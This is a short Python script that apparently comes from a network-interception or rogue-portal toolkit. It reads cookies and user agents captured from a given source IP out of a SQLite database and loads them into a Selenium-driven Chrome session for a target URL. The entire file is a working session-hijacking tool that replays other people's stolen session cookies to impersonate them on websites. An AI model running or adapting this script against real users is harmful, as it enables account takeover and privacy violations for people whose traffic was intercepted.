from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import sqlite3
import sys

def usage():
    print('python browse_cookies.py source_ip target_url cookies_db')

if len(sys.argv) < 4:
    usage()
    exit(1)

src = sys.argv[1]
url = sys.argv[2]
cookies_db = sqlite3.connect(sys.argv[3])
c = cookies_db.cursor()

c.execute('select name, value, user_agent from cookies where src = ? and url like ?', (src, url + '%'))
cookies = c.fetchall()

if len(cookies) == 0:
    print('No cookies for this URL')
    exit(0)

opts = Options()
opts.add_argument('user-agent=' + cookies[0][2])
opts.add_argument('--no-sandbox')
driver = webdriver.Chrome(executable_path='portal/chromedriver', chrome_options=opts)
driver.get('http://' + url)

for cookie in cookies:
    driver.add_cookie({'name': cookie[0], 'value': cookie[1]})

driver.get('http://' + url)

cookies_db.close()
